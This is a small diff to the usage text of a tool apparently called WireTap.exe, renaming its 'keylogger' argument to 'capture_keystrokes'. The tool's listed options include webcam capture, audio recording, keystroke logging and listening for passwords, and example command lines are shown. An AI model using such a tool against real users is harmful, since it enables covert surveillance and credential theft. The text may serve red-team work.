@@ -59,7 +59,7 @@ Arguments can be one (and only one) of the following:
 
     capture_webcam       - Capture images from the user's attached webcam (if it exists).
 
-    keylogger            - Begin logging keystrokes to a file.
+    capture_keystrokes   - Begin logging keystrokes to a file.
 
     listen_for_passwords [keyword1,keyword2,keyword3] - Listens for words 'username', 'password', 'login',
                                                         'logon', and 'credential' by default and when
@@ -70,7 +70,7 @@ Examples:
         WireTap.exe record_audio 30s
 
     Start the keylogger:
-        WireTap.exe keylogger
+        WireTap.exe capture_keystrokes
 
     Start keyword listener (for a custom-set of strings):
         WireTap.exe listen_for_passwords oil,password,email
